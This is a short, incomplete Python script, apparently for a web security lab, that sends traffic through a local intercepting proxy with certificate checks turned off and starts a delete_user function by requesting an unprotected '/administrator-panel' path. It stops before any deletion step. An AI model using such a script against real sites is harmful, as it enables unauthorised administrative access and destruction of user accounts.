import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'https://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def delete_user(url):
    admin_panel_url = url + '/administrator-panel'
    r = requests.get(admin_panel_url, verify=False, proxies=proxies)
    